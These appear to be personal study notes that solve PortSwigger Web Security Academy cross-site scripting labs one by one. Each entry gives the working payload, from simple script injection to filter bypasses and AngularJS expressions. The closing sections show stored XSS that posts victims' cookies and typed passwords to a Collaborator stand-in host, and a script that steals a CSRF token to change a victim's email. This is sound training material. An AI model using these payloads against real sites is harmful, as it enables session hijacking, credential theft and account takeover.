z### Reflected XSS into HTML context with nothing encoded

Payload: `<script>alert(1)</script>`

---
### Stored XSS into HTML context with nothing encoded

Payload: `<script>alert(1)</script>`

---
### DOM XSS in `document.write` sink using source `location.search`

When input a random string, can see that my payload is between an `img src` attribute. So, we need to escape that, and generate our payload:

Payload: `"><img src=1 onerror=alert(1)>`

---
### DOM XSS in `innerHTML` sink using source `location.search`

Input this `<img src=1 onerror=alert(1)>`

---
### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

When you go to the submit feedback page, the url is: `/feedbadk=returnPath=/post`. And after submitting, you can click on the "Back" link and it sends you wherever this returnPath points to. So here, this value is being passed to a href like this: `<a id="backLink" href="/post">Back</a>` if you input this `javascript:alert(1)` you can execute JS.

> Always look if you can control something from another side

---
### DOM XSS in jQuery selector sink using a hashchange event

The page presents this script at the bottom. 
```html
<script>
	$(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
</script>
```

Let's break this down:
`$(window).on('hashchange', function(){ ... })`: This line attaches an event listener to the `hashchange` event of the `window` object. This means that whenever the hash part of the URL changes (e.g., when navigating within the same webpage using anchor links), the function inside the curly braces will be executed.
`var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`: This line finds an element within the webpage based on the hash value in the URL. It uses jQuery selectors to search for a `<h2>` element inside a `<section>` element with the class `blog-list` that contains the text corresponding to the hash value. The hash value is obtained from the URL, decoded (in case it contains special characters), and sliced to remove the leading `#` symbol.
`if (post) post.get(0).scrollIntoView();`: This line checks if the `post` variable is defined (i.e., if an element matching the selector was found). If so, it gets the DOM element (the first one, since `post` is a jQuery object), and then scrolls the webpage so that this element is in view.

![[Pasted image 20240502202438.png]]
We can see the page is trying to scroll wherever the location.hash says. So let's try to inject our XSS payload there:
![[Pasted image 20240502202600.png]]
The excersise requires to send the payload to the victim, you can use the payload they provide. 

---
### Reflected XSS into attribute with angle brackets HTML encoded

Let's first input a random string "testing" and try to find it with the dev tools.
You will see this line:
`<input type="text" placeholder="Search the blog..." name="search" value="testing">`
You can see that we control the "value" parameter, so the idea here is to escape that value, and add anotherone, like maybe "onmouseover"=alert(1)
And it would be something like this:
`<input type="text" placeholder="Search the blog..." name="search" value="XXX" "onmouseover="alert(1)>`
We are adding another value, that makes the XSS explode.

---
### Stored XSS into anchor href attribute with double quotes HTML encoded

The href parameter can be `website=javascript:alert(1)`

---
### Reflected XSS into a JavaScript string with angle brackets HTML encoded
We have this script: 
```js
<script>
	var searchTerms = 'test'';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

As wee see, we need to escape the "searchTerms" string. We can do that by injecting a single quote, but now we have another single quote at the end
`var searchTerms = 'test'';` so we concatenate some JS code, and then we finish again with a single quote. Like this:
`var searchTerms = 'test ' ; alert(1) ; ' ';`

This will do the trick.

---
### DOM XSS in `document.write` sink using source `location.search` inside a select element

When you add to the querystring "storeId=test" you can see it listed on the dropdown list.
In the code, this value is between a <\select> tag. So you need to escape that, and trigger the alert. You can do it by doing this:
`</select><img src=1 onerror=alert(1)>`
![[Pasted image 20240511182458.png]]

---
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML encoded

AngularJS is a widely-used JavaScript framework that interacts with HTML through attributes known as directives, a notable one being `ng-app`. This directive allows AngularJS to process the HTML content, enabling the execution of JavaScript expressions inside double curly braces.

In scenarios where user input is dynamically inserted into the HTML body tagged with `ng-app`, it's possible to execute arbitrary JavaScript code. This can be achieved by leveraging the syntax of AngularJS within the input.

This is the payload:
`{{ $eval.constructor('alert()')() }}` or `{{ $on.constructor('alert()')() }}`

Explanation:
https://www.youtube.com/watch?v=QpQp2JLn6JA

---
### Reflected DOM XSS
#info

When you input some text in the search box, you'll see it reflected on the web page HTML
![[Pasted image 20240524105311.png]]
We can see in the "network" tab there are some js files loading. Let's take a look at "searchResults.js".

![[Pasted image 20240524105429.png]]
We can see the js is not obfuscated, and there is in a separate file. Let's see what is doing:
![[Pasted image 20240524105647.png]]
We see it's a function "search" expecting a parameter "path". And as wee saw in the first HTML, before our value is reflected, we see a script `<script>search('search-results')</script>`
First the xhr variable being created, and assigned to a built in JS object called XMLHTTPRequest. **This is not that common today, because has been replaced by promises**
Creates an asynchronous request to an external resource. This is called AJAX (Asynchronous JS and XML)
We then bind a function to an event listener "onreadystatechange" The `readystatechange` event is fired whenever the `readyState` property of the `XMLHttpRequest` changes.
Is the readystate is exactly equal to 4 (indicates the state of the request, in this case "4 = The operation is complete") and status 200 (OK)
It does the eval('var searchResultsObj = ' + this.responseText)
Then calls the displaySearchResults function

To initiate this HTTP request, we need to use the ".open" method. It's a GET , the PATH (provided trough the original HTML odcument) + window.location.search (everything after the querystring)
then we dispatch the request via the ".send"

In this case, eval() is concatenating to a string 'var searchResultsObj = ' to this.response

What does the eval() function: The **`eval()`** function evaluates JavaScript code represented as a string and returns its completion value. The source is parsed as a script.

So, if we refresh the page, we should see an AJAX HTTP request send to "searchResults" in the Network tab. Let's see the response:
![[Pasted image 20240524111749.png]]
The response is a JSON object. The results key, which is empty due to no results. 
And the "searchTerm", with our value that is being reflected into our page. 

Let's look our request/response in burp, and try to break it:
By input `batman"-alert()` we fail, because we see it's escaping our double quote with a back slash: `:"batman\"-alert()"}`. So, let's try input a backslash to escape our double quote:
`batman\"-alert()`, and we see it breaks out of the JSON: `:"batman\\"-alert()"}` because the "-alert()" is not highlighted in green color in burp:
![[Pasted image 20240524112416.png]]
We don't have a valid JS objcet, because of the double quote and the end of the object "}". 
So let's comment that out, and use that as a payload:
`batman\"-alert()}//`, and the response is a valid JS object. 
![[Pasted image 20240524112627.png]]
[[Examples#Reflected DOM XSS]] Here you can see an example.

---
### Stored DOM XSS
#info
With the Network label in the DevTools window, we'll see when we open a post, the "loadCommentsWithVulnerabieEscapeHtml.js" is being loaded. So let's look that script:

We see there are 2 functions, one to "loadComments", and the other to "displayComments". And there is another one, called "escapeHTML" Which seems to be sanitizing the input:
![[Pasted image 20240524094317.png]]

We,ll solve the lab by adding more ">" and "<".  This will be our payload: `<><img src=1 onerror=alert(1)>`

This vulnerability arises because the method "**replace()**", used by our escapeHTML function, has this property: 
If `pattern` is a string, only the first occurrence will be replaced. The original string is left unchanged.

**We can spot this is DOM based, because if we inspect the HTML of the post page, there are no comments in there. So the comments are being loaded via JS**

<u>The safe way is store the comment in the server. Strip the special characters with HTML encoding. There is nothing to be done from the front end. JS should be for extra defense, but cant rely on JS to sanitize.</u>

---
### Reflected XSS into HTML context with most tags and attributes blocked

Here you'll learn how to use Burp intruder and [THIS LIST](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to test for XSS. 
This will be your final payload: 
`<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

---
### Reflected XSS into HTML context with all tags blocked except custom ones

```text
<script>
location = 'https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

---
### Reflected XSS with some SVG markup allowed

Here you'll learn how to use Burp intruder and [THIS LIST](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to test for XSS. 
This will be your final payload: 
`https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

---
### Reflected XSS in canonical link tag

You will trigger the exploit by clicking "accesskey + X" in this case. This is the payload:
`/?%27accesskey=%27x%27onclick=%27alert(1)` and you can trigger that by pressing:

Windows: ALT + SHIFT + X
MacOS: CTRL + ALT + X
Linux: ALT + X

---
### Reflected XSS into a JavaScript string with single quote and backslash escaped

You have control over the "asd" value here:
![[Pasted image 20240723122204.png]]

So, need to escape the script tag, and create the second one. This is your payload:
`</script><script>alert(1)</script>`

---
### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

This is your payload: `\'-alert(1)//`

---
### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

It's reflecting the content of the "Website" when you send a comment. So, let's inject there.

This is your payload: `http://foo?&apos;-alert(1)-&apos;`

---
### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped


This is your payload: `${alert(1)}`

---
### Exploiting cross-site scripting to steal cookies

This is the payload for the comment: 
`<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`

This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.

---
### Exploiting cross-site scripting to capture passwords

This is the same payload as the previous one, but here we're sending the username and password instead of a cookie:

`<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`

---
### Exploit XSS to perform CSRF

To change the email, you need to bypass the CSRF protection, so, by posting this comment, you can get anyone accessing this post, his email change:

`<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>`
